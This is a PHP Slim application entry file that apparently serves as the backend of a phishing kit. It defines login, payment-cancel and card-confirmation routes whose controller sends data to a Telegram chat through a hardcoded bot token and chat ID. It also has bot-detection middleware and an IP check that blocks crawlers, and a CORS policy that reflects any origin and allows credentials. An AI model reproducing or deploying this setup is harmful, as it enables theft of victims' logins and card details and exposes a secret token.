<?php
declare(strict_types=1);

use DI\Container;
use Dotenv\Dotenv;
use Monolog\Logger;
use Monolog\Handler\StreamHandler;
use Psr\Http\Server\RequestHandlerInterface as RequestHandler;
use Psr\Http\Message\ResponseInterface as Response;
use Psr\Http\Message\ServerRequestInterface as Request;
use Slim\Factory\AppFactory;
use Slim\Exception\HttpBadRequestException;
use Slim\Routing\RouteCollectorProxy;
use App\Controllers\ApiController;
use App\Security\BotDetector;
use App\Security\BotDetectionMiddleware; // Changé pour correspondre au nouveau namespace
use Psr\Container\ContainerInterface;

require __DIR__ . '/../vendor/autoload.php';

// Load .env
$dotenv = Dotenv::createImmutable(__DIR__ . '/../');
$dotenv->safeLoad();

// Create Container and App
$container = new Container();
AppFactory::setContainer($container);
$app = AppFactory::create();

// Add error middleware (displayErrorDetails = false in prod)
$displayErrorDetails = getenv('APP_DEBUG') === 'true';
$errorMiddleware = $app->addErrorMiddleware($displayErrorDetails, true, true);

// Logger
$log = new Logger('app');
$log->pushHandler(new StreamHandler(__DIR__ . '/../logs/app.log', Logger::INFO));
$container->set('logger', $log);

// Initialisation du BotDetector
$container->set('botDetector', function (ContainerInterface $container) {
    $logger = $container->get('logger');
    return new BotDetector($logger);
});

// Telegram client depends on env vars
$container->set('telegram', function() {
    return new App\TelegramClient("8286952693:AAHRYIiqh52Ae1KFZmlraKtNhHFBrJYpALI", "-1003059387910");
});

// Initialisation du BotDetectionMiddleware
$container->set(BotDetectionMiddleware::class, function (ContainerInterface $container) {
    return new BotDetectionMiddleware($container->get('botDetector'));
});

// CORS middleware (simple)
// Remplacez votre middleware CORS actuel par ceci
$app->add(function ($request, $handler) {
    $response = $handler->handle($request);
    
    // Récupérer l'origine de la requête
    $origin = $request->getHeaderLine('Origin');
    
    // Si une origine est spécifiée, on l'utilise, sinon on utilise le wildcard
    if (!empty($origin)) {
        $response = $response
            ->withHeader('Access-Control-Allow-Origin', $origin)
            ->withHeader('Access-Control-Allow-Credentials', 'true');
    } else {
        $response = $response->withHeader('Access-Control-Allow-Origin', '*');
    }
    
    // Headers supplémentaires
    $response = $response
        ->withHeader('Access-Control-Allow-Headers', 'X-Requested-With, Content-Type, Accept, Origin, Authorization, X-CSRF-Token')
        ->withHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS')
        ->withHeader('Access-Control-Expose-Headers', 'Authorization')
        ->withHeader('Access-Control-Max-Age', '86400'); // 24 heures
        
    return $response;
});

// Ajout de middleware de detection de bot
$app->add(BotDetectionMiddleware::class);

// If OPTIONS preflight
// Middleware pour gérer les requêtes OPTIONS
$app->options('/{routes:.+}', function ($request, $response, $args) {
    return $response;
});

// Define routes under /api
$app->group('/api', function (RouteCollectorProxy $group) use ($container) {
    $group->get('/', [new ApiController($container->get('telegram'), $container->get('logger')), 'root']);
    $group->post('/login', [new ApiController($container->get('telegram'), $container->get('logger')), 'login']);
    $group->post('/cancel', [new ApiController($container->get('telegram'), $container->get('logger')), 'cancelPayment']);
    $group->post('/confirm', [new ApiController($container->get('telegram'), $container->get('logger')), 'cardConfirmation']);
    $group->get('/check-ip', function (Request $request, Response $response) {
        $serverParams = $request->getServerParams();
        $ipAddress = $serverParams['REMOTE_ADDR'] ?? '';
        
        // Gestion des proxies
        if (!empty($serverParams['HTTP_X_FORWARDED_FOR'])) {
            $ips = explode(',', $serverParams['HTTP_X_FORWARDED_FOR']);
            $ipAddress = trim($ips[0]);
        }
        $botDetector = $this->get('botDetector');
        $isBot = $botDetector->detectBot($ipAddress);
        
         // Méthode alternative pour renvoyer du JSON
        $data = ['allowed' => !$isBot];
        $payload = json_encode($data);
        
        $response->getBody()->write($payload);
        return $response
            ->withHeader('Content-Type', 'application/json')
            ->withStatus($isBot ? 403 : 200);
    });
});

// Run app
$app->run();